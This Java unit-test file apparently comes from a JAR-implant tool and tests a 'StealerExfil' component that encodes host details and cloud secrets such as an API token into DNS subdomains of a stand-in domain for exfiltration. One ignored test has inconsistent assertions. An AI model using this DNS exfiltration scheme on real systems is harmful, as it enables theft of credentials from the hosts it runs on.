package io.github.w1th4d.jarplant.implants;

import org.junit.Before;
import org.junit.Ignore;
import org.junit.Test;

import java.util.HashMap;
import java.util.List;
import java.util.Map;

import static org.junit.Assert.assertEquals;

public class StealerExfilTests {
    @Before
    public void resetStaticFields() {
        StealerExfil.CONF_SUBDOMAIN_MAX_LEN = 63;
        StealerExfil.CONF_FQDN_MAX_LEN = 253;
    }

    @Test
    public void testSplit_SmallInput_OneRequest() {
        // Arrange
        String encodedData = "abc123";
        String uniqueId = "something";
        String baseDomain = "example.com";

        // Act
        List<String> fqdns = StealerExfil.split(encodedData, uniqueId, baseDomain);

        // Assert
        assertEquals(1, fqdns.size());
        assertEquals("abc123.something-0.example.com", fqdns.get(0));
    }

    @Test
    public void testSplit_LowSubdomainMax_SeveralSubdomains() {
        // Arrange
        String encodedData = "abc123";
        String uniqueId = "something";
        String baseDomain = "example.com";

        // Act
        StealerExfil.CONF_SUBDOMAIN_MAX_LEN = 3;
        List<String> fqdns = StealerExfil.split(encodedData, uniqueId, baseDomain);

        // Assert
        assertEquals(1, fqdns.size());
        assertEquals("abc.123.something-0.example.com", fqdns.get(0));
    }

    @Test
    @Ignore // TODO split() does not respect CONF_MAX_FQDN_LEN properly
    public void testSplit_LowMaxFqdn_SeveralRequests() {
        // Arrange
        String encodedData = "abc123";
        String uniqueId = "1337";
        String baseDomain = "something.example.com";
        int overheadLength = 1 + uniqueId.length() + 6 + baseDomain.length();

        // Act
        StealerExfil.CONF_FQDN_MAX_LEN = overheadLength + (encodedData.length() / 2);
        List<String> fqdns = StealerExfil.split(encodedData, uniqueId, baseDomain);

        // Assert
        assertEquals(2, fqdns.size());
        assertEquals("abc.something-0.example.com", fqdns.get(0));
        assertEquals("123.something-0.example.com", fqdns.get(0));
    }

    // This method can be used to generate some synthesised test data for the decoder
    public static void main(String[] args) {
        Map<String, String> testValues = new HashMap<>();
        testValues.put("host", "test-host-01");
        testValues.put("user", "service-user");
        testValues.put("os", "Linux v1.2.3-something4");
        testValues.put("jvm", "UberJDK v1.2.3-something4");
        testValues.put("CLOUD_SECRET_UID", "secret-id");
        testValues.put("CLOUD_API_TOKEN", "super-sensitive-api-token");

        StealerExfil.CONF_DOMAIN = "something.example.com";
        StealerExfil.CONF_SUBDOMAIN_MAX_LEN = 20;
        StealerExfil.CONF_FQDN_MAX_LEN = 100;

        List<String> encoded = StealerExfil.encode(testValues);
        for (String fqdn : encoded) {
            System.out.println(fqdn);
        }
    }
}
